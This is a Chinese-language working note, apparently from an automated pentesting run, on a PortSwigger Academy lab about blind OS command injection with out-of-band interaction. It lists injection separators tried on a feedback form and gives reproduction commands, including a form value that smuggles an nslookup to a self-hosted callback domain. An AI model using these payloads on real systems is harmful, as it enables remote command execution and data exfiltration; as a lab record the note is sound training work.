---
title: "lab-blind-out-of-band"
links:
  - target: oob-callback-family
    relation: evidences
  - target: blind-injection-family
    relation: evidences
---

# lab-blind-out-of-band

> evidences: [[oob-callback-family]], [[blind-injection-family]]

- 题面:Blind OS command injection with out-of-band interaction(/web-security/os-command-injection/lab-blind-out-of-band)
- 实例:https://0ae900fe048b072e8024123200ca00eb.web-security-academy.net
- slug(真):即请求 slug(lab_id 6E6E115E…)
- 判定目标:盲命令注入,向外部域发 DNS 查询;状态:**stuck**(OOB DNS 腿从 lab 侧不可达)

## 已确认

1. `/feedback` → POST `/feedback/submit`,字段 `csrf,name,email,subject,message`;返回 `{}`(命令异步执行,无响应回显)。
2. 注入尝试(均无 OOB 命中):
   - 字段:email / name / subject / message 各试;
   - 分隔:`;`、`||`、`$(...)`、反引号、换行;
   - 还试了直连解析器 `nslookup <m>.oob.dthack.io 47.131.34.33`。
3. OOB 基建自测:ns 主机 `nslookup b16selftest.oob.dthack.io 127.0.0.1` → `~/prs-oob/dns.log` 立现;
   日志亦有历史外部递归探针(*.probe.oob.dthack.io,from 36.110.129.20)。→ zone 记录/委派正常。
4. 但 **grep b16 只有 selftest 2 条**,约 10 次注入零条 lab 源查询。

## 未决面 / 卡点

- lab 出站被 PortSwigger 防火墙挡(仅放行官方 Collaborator),自建 `oob.dthack.io` 的 DNS 腿从 lab 侧不可达;
  HTTP 回调腿本就缺。**需外部底座放行 lab 出站或改用官方 Collaborator 才能收口**-非注入面问题(注入面见上,已覆盖四字段)。
- 不要就此硬造。

## 复现命令

```
lab_launch launch 6E6E115E1981AE822B7E41FCACCBC1CB96A5D85B63B42B80E3E6D35565209752 --widget-source /web-security/os-command-injection --jar /tmp/b16-jar1.json
# 取 /feedback 的 csrf 后:
lab_http post "<inst>/feedback/submit" --jar /tmp/b16-jar1.json --form csrf=<csrf> --form name=test --form "email=x@a.com||nslookup <m>.oob.dthack.io||" --form subject=s --form message=m
sh_run -- ssh ubuntu@47.131.34.33 "grep -i <m> ~/prs-oob/dns.log"
```

## 回马复核(OOB HTTP 腿已通后重试)

- 新实例 `0a66003304ac04f48044b2ee00880007`;OOB HTTP 腿本机侧验证通
  (`lab_http get http://ns.oob.dthack.io:9999/hostreach1` → `/tmp/oob-http.log` 现 `hostreach1`)。
- 4 字段 ×{`;` `||` `|` `&&` `$()` 反引号 `%0a` `'` 破引号}×{`+` `%20` `${IFS}`}×
  {HTTP:9999 / 直连 IP / DNS nslookup},共 ~30 载荷(叠加 b16 共 40+),`oob-http.log` 与
  `dns.log` **零 lab 源命中**;反馈提交恒 200 `{}`,命令异步(实测 `;sleep 5;` 不拖延响应)。
- 结论不变:**lab 出站到自建 OOB 域不可达**(PortSwigger 仅放行官方 Collaborator),
  自建回调无法收口该题;注入面已穷举(四字段)。不再硬造。
